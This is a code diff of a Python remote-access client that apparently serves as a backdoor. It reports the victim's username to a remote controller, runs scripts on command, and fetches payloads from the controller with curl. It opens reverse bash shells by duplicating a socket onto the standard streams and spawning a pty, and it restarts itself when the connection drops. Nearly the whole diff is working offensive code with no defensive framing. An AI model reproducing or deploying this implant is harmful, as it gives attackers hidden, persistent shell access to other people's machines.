@@ -8,27 +8,50 @@ import random
 import string
 import os
 from time import sleep
+import sys
+import pty
 
 
 class EnvKeys:
+    NO_RESTART = 'NO_RESTART'
+    OPEN_SHELL_CLASSIC_PORT = 'OPEN_SHELL_CLASSIC_PORT'
+    OPEN_SHELL_TUNNELED_CONVERSATION_UID = 'OPEN_SHELL_TUNNEL_CONVERSATION_UID'
+    PYTERPRETER = 'PYTERPRETER'
     REMOTE_IP = 'REMOTE_IP'
     REMOTE_PORT = 'REMOTE_PORT'
     RESOURCES_PORT = 'RESOURCES_PORT'
-    SHELL_CONVERSATION_UID = 'SHELL_CONVERSATION_UID'
 
 
 class Env:
+    no_restart = bool(os.environ.get(EnvKeys.NO_RESTART))
+    open_shell_classic_port = os.environ.get(EnvKeys.OPEN_SHELL_CLASSIC_PORT, None)
+    open_shell_tunneled_conversation_uid = os.environ.get(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID, None)
+    pyterpreter = 'YEET'
     remote_ip = os.environ.get(EnvKeys.REMOTE_IP, 'localhost')
-    remote_port = int(os.environ.get(EnvKeys.REMOTE_PORT, 1337))
+    remote_port = int(os.environ.get(EnvKeys.REMOTE_PORT, 50000))
     resources_port = int(os.environ.get(EnvKeys.RESOURCES_PORT, 1338))
-    shell_conversation_uid = os.environ.get(EnvKeys.SHELL_CONVERSATION_UID, None)
+
+
+class Process:
+    @staticmethod
+    def get_cmd_output(cmd: str, strip_new_line=True) -> str:
+        proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+        if strip_new_line and proc.stdout.decode()[-1] == '\n':
+            return proc.stdout.decode()[:-1]
+        else:
+            return proc.stdout.decode()
+
+    @staticmethod
+    def spawn_self_with_env(env: dict):
+        subprocess.Popen(['python3', __file__], env={**os.environ, **env}, stdin=subprocess.DEVNULL)
 
 
 class Message:
     PONG = 'PONG'
     REPLY = 'REPLY'
     RUN_SCRIPT = 'RUN_SCRIPT'
-    OPEN_SHELL = 'OPEN_SHELL'
+    OPEN_SHELL_TUNNELED = 'OPEN_SHELL'
+    OPEN_SHELL_CLASSIC = 'OPEN_SHELL_CLASSIC'
     conversation_uid: str
     purpose: str
     args: Tuple[str]
@@ -61,16 +84,32 @@ class Communication:
         Thread(target=Communication._pong_forever, daemon=True).start()
 
     @staticmethod
+    def on_communication_broken():
+        print('Communication broken...')
+        sleep(1)
+        if not Env.no_restart:
+            print('Restarting')
+            os.execvp(sys.executable, [sys.executable, *sys.argv])
+        else:
+            exit(1)
+
+    @staticmethod
     def _receive_messages_forever(sock: socket.socket):
-        while True:
-            Communication.messages_received.put(Message.from_raw(Core.receive_line_from_sock(sock)))
+        try:
+            while True:
+                Communication.messages_received.put(Message.from_raw(Core.receive_line_from_sock(sock)))
+        except BrokenPipeError:
+            Communication.on_communication_broken()
 
     @staticmethod
     def _send_messages_forever(sock: socket.socket):
-        header_parts = [Config.username.encode()]
-        sock.send(b':'.join([b64encode(header_part) for header_part in header_parts]) + b'\n')
-        while True:
-            sock.send(Communication.messages_to_send.get().to_raw() + b'\n')
+        try:
+            header_parts = [Config.username.encode()]
+            sock.send(b':'.join([b64encode(header_part) for header_part in header_parts]) + b'\n')
+            while True:
+                sock.send(Communication.messages_to_send.get().to_raw() + b'\n')
+        except BrokenPipeError:
+            Communication.on_communication_broken()
 
     @staticmethod
     def _pong_forever():
@@ -108,51 +147,55 @@ class MessageProcessor:
                     stderr.decode(),
                     conversation_uid=message.conversation_uid
                 ))
-            elif message.purpose == Message.OPEN_SHELL:
-                subprocess.Popen(['python3', __file__], env={**os.environ, **{EnvKeys.SHELL_CONVERSATION_UID: message.conversation_uid}}, stdin=subprocess.DEVNULL)  # , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            elif message.purpose == Message.OPEN_SHELL_TUNNELED:
+                Process.spawn_self_with_env({EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID: message.conversation_uid})
+            elif message.purpose == Message.OPEN_SHELL_CLASSIC:
+                Process.spawn_self_with_env({EnvKeys.OPEN_SHELL_CLASSIC_PORT: message.args[0]})
             else:
                 send_error_message('process_messages_forever', f'Unknown message purpose {message.purpose}')
 
     @staticmethod
     def _get_resource(category: str, name: str) -> bytes:
         print(f'{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
-        curl = subprocess.run(['curl', '-s', f'http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        if curl.returncode != 0:
-            send_error_message('process_messages_forever', f'Resources server down or missing {category}/{name}\n{curl.stderr.decode()}')
-            raise Exception()
-        return curl.stdout
-
-
-def get_cmd_output(cmd: str, strip_new_line=True) -> str:
-    proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
-    if strip_new_line and proc.stdout.decode()[-1] == '\n':
-        return proc.stdout.decode()[:-1]
-    else:
-        return proc.stdout.decode()
+        return Process.get_cmd_output(f'curl -s http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}', False).encode()
 
 
 class Config:
-    username: str
-
-    @staticmethod
-    def initialise():
-        Config.username = get_cmd_output('whoami')
+    username = Process.get_cmd_output('whoami')
 
 
 def main():
-    if Env.shell_conversation_uid is not None:
-        os.environ.pop(EnvKeys.SHELL_CONVERSATION_UID)
-        header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL, Env.shell_conversation_uid])
+    if os.environ.get(EnvKeys.PYTERPRETER) is None:
+        os.environ[EnvKeys.PYTERPRETER] = Env.pyterpreter
+        print((sys.executable, sys.argv))
+        os.execvp(sys.executable, [sys.executable, *sys.argv])
+    elif Env.open_shell_tunneled_conversation_uid is not None:
+        os.environ.pop(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID)
+        header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL_TUNNELED, Env.open_shell_tunneled_conversation_uid])
         sock = socket.create_connection((Env.remote_ip, Env.remote_port))
         sock.send(header + b'\n')
-        stdin = sock.makefile('rb', 0)
-        stdout = sock.makefile('wb', 0)
-        exit(subprocess.run(['bash'], stdin=stdin, stdout=stdout, stderr=subprocess.DEVNULL).returncode)
+        [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
+        pty.spawn("/bin/bash")
+    elif Env.open_shell_classic_port is not None:
+        os.environ.pop(EnvKeys.OPEN_SHELL_CLASSIC_PORT)
+        sock = socket.socket()
+        while True:
+            try:
+                sock.connect((Env.remote_ip, int(Env.open_shell_classic_port)))
+            except ConnectionError:
+                sleep(0.5)
+            else:
+                break
+        [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
+        pty.spawn("/bin/bash")
     else:
-        Config.initialise()
-        sock = socket.create_connection((Env.remote_ip, Env.remote_port))
-        Communication.initialise_communication(sock)
-        MessageProcessor.process_messages_forever()
+        try:
+            sock = socket.create_connection((Env.remote_ip, Env.remote_port))
+        except ConnectionError:
+            Communication.on_communication_broken()
+        else:
+            Communication.initialise_communication(sock)
+            MessageProcessor.process_messages_forever()
 
 
 def send_error_message(location: str, error: str):
